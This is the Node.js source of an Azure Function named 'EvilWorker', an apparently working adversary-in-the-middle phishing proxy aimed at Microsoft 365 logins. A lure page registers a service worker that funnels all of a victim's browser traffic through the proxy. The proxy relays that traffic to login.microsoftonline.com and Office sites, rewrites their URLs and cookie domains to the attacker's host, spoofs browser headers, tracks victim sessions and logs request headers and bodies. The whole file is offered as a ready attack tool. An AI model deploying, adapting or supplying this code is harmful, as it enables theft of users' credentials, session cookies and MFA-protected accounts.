const crypto = require('crypto');

// EvilWorker Configuration
const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);

const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/Mutation_o5y3f4O7jMGW",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico"
};

const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
const VICTIM_SESSIONS = {};

// HTML content for service worker registration
const INDEX_HTML = `<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
</head>
<body>
    <script>
        if ("serviceWorker" in navigator) {
            navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
                scope: "/",
            })
                .then((registration) => {
                    const phishedParameterURL = new URL(self.location.href).searchParams.get("redirect_urI");
                    const phishedURL = new URL(decodeURIComponent(phishedParameterURL));
                    self.location.replace(phishedURL.pathname + phishedURL.search);
                })
                .catch((error) => {
                    console.error("Service worker registration failed:", error);
                });
        } else {
            console.error("Service workers are not supported by this browser");
        }
    </script>
</body>
</html>`;

// Service Worker content
const SERVICE_WORKER_JS = `self.addEventListener("fetch", (event) => {
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const proxyRequestURL = "\${self.location.origin}/lNv1pC9AWPUY4gbidyBO";

    try {
        const proxyRequest = {
            url: request.url,
            method: request.method,
            headers: Object.fromEntries(request.headers.entries()),
            body: await request.text(),
            referrer: request.referrer,
            mode: request.mode
        };
        
        return fetch(proxyRequestURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify(proxyRequest),
            redirect: "manual",
            mode: "same-origin"
        });
    }
    catch (error) {
        console.error("Fetching \${proxyRequestURL} failed:", error);
    }
}`;

// 404 page
const NOT_FOUND_HTML = `<!DOCTYPE html>
<html>
<head>
    <title>404 - Page Not Found</title>
</head>
<body>
    <h1>404 - Page Not Found</h1>
    <p>The requested page could not be found.</p>
</body>
</html>`;

// Main Azure Function
module.exports = async function (context, req) {
    const { method, url, headers } = req;
    const currentSession = getUserSession(headers.cookie);

    try {
        // Handle service worker registration page
        if (url && url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
            const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
            let session = currentSession;

            if (!currentSession) {
                const { cookieName, cookieValue } = generateNewSession(phishedURL);
                context.res = {
                    status: 200,
                    headers: {
                        "Content-Type": "text/html",
                        "Set-Cookie": `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`
                    },
                    body: INDEX_HTML
                };
                return;
            }

            VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
            VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
            VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
            VICTIM_SESSIONS[session].port = phishedURL.port;
            VICTIM_SESSIONS[session].host = phishedURL.host;

            context.res = {
                status: 200,
                headers: { "Content-Type": "text/html" },
                body: INDEX_HTML
            };
            return;
        }

        // Handle service worker file
        if (url === PROXY_PATHNAMES.serviceWorker) {
            context.res = {
                status: 200,
                headers: { "Content-Type": "application/javascript" },
                body: SERVICE_WORKER_JS
            };
            return;
        }

        // Handle proxy requests from service worker
        if (url === PROXY_PATHNAMES.proxy) {
            if (method !== 'POST') {
                context.res = { status: 405 };
                return;
            }

            const proxyRequest = JSON.parse(req.body);
            const targetURL = new URL(proxyRequest.url);

            // Prepare headers for upstream request
            const headers = { ...proxyRequest.headers };
            headers['host'] = targetURL.host;
            headers['origin'] = targetURL.origin;
            headers['referer'] = targetURL.origin;

            // Remove problematic headers
            delete headers['content-length'];
            delete headers['x-forwarded-for'];
            delete headers['x-forwarded-host'];

            // Add realistic browser headers
            headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36';
            headers['accept-encoding'] = 'gzip, deflate, br';
            headers['accept-language'] = 'en-US,en;q=0.9';
            headers['sec-ch-ua'] = '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"';
            headers['sec-ch-ua-mobile'] = '?0';
            headers['sec-ch-ua-platform'] = '"Windows"';
            headers['sec-fetch-dest'] = 'document';
            headers['sec-fetch-mode'] = 'navigate';
            headers['sec-fetch-site'] = 'none';
            headers['sec-fetch-user'] = '?1';
            headers['upgrade-insecure-requests'] = '1';

            // Make the upstream request
            const upstreamResponse = await fetch(targetURL.toString(), {
                method: proxyRequest.method,
                headers,
                body: proxyRequest.body || undefined,
                redirect: 'manual'
            });

            // Get response data
            const contentType = upstreamResponse.headers.get('content-type') || '';
            let responseData;

            if (/^(text\/html|application\/javascript|text\/javascript|application\/json|text\/css)/i.test(contentType)) {
                responseData = await upstreamResponse.text();

                // Transform content to replace Microsoft URLs with our domain
                const functionHost = context.req.headers.host;
                responseData = responseData
                    .replace(/https:\/\/login\.microsoftonline\.com/g, `https://${functionHost}`)
                    .replace(/https:\/\/portal\.office\.com/g, `https://${functionHost}`)
                    .replace(/https:\/\/www\.office\.com/g, `https://${functionHost}`)
                    .replace(/action="\/common\/login"/g, `action="https://${functionHost}/common/login"`)
                    .replace(/action="\/common\/reprocess"/g, `action="https://${functionHost}/common/reprocess"`);
            } else {
                responseData = await upstreamResponse.arrayBuffer();
            }

            // Prepare response headers
            const responseHeaders = {};
            upstreamResponse.headers.forEach((value, key) => {
                const k = key.toLowerCase();
                if (k === 'set-cookie') {
                    // Rewrite cookie domain
                    const rewrittenCookies = value.split(',').map(c => 
                        c.replace(/Domain=[^;]+/i, `Domain=${context.req.headers.host}`)
                    );
                    responseHeaders[key] = rewrittenCookies;
                } else if (k === 'location') {
                    // Rewrite location header
                    const rewritten = value
                        .replace(/https:\/\/login\.microsoftonline\.com/g, `https://${context.req.headers.host}`)
                        .replace(/https:\/\/portal\.office\.com/g, `https://${context.req.headers.host}`);
                    responseHeaders[key] = rewritten;
                } else if (!['server', 'x-powered-by', 'x-aspnet-version'].includes(k)) {
                    responseHeaders[key] = value;
                }
            });

            // Log the interaction (encrypted)
            logInteraction(proxyRequest, upstreamResponse.status, contentType);

            // Send response
            context.res = {
                status: upstreamResponse.status,
                headers: responseHeaders,
                body: responseData instanceof ArrayBuffer ? Buffer.from(responseData) : responseData
            };
            return;
        }

        // Handle favicon
        if (url === PROXY_PATHNAMES.favicon) {
            context.res = { status: 404 };
            return;
        }

        // Default: serve 404
        context.res = {
            status: 404,
            headers: { "Content-Type": "text/html" },
            body: NOT_FOUND_HTML
        };

    } catch (error) {
        context.log.error('EvilWorker error:', error);
        context.res = {
            status: 503,
            body: { error: 'Service temporarily unavailable' }
        };
    }
};

// Helper functions
function getUserSession(cookieHeader) {
    if (!cookieHeader) return null;
    
    const cookies = cookieHeader.split(';').map(c => c.trim().split('='));
    for (const [name, value] of cookies) {
        if (VICTIM_SESSIONS[value]) {
            return value;
        }
    }
    return null;
}

function generateNewSession(phishedURL) {
    const cookieName = `session_${crypto.randomBytes(16).toString('hex')}`;
    const cookieValue = crypto.randomBytes(32).toString('hex');
    
    VICTIM_SESSIONS[cookieValue] = {
        protocol: phishedURL.protocol,
        hostname: phishedURL.hostname,
        path: `${phishedURL.pathname}${phishedURL.search}`,
        port: phishedURL.port,
        host: phishedURL.host
    };
    
    return { cookieName, cookieValue };
}

function logInteraction(request, status, contentType) {
    try {
        const logData = {
            timestamp: new Date().toISOString(),
            url: request.url,
            method: request.method,
            status: status,
            contentType: contentType,
            headers: request.headers,
            body: request.body ? request.body.substring(0, 1000) : null
        };
        
        // Encrypt the log data
        const cipher = crypto.createCipher('aes-256-ctr', ENCRYPTION_KEY);
        let encrypted = cipher.update(JSON.stringify(logData), 'utf8', 'hex');
        encrypted += cipher.final('hex');
        
        console.log('ENCRYPTED_LOG:', encrypted);
    } catch (error) {
        console.error('Logging error:', error);
    }
}
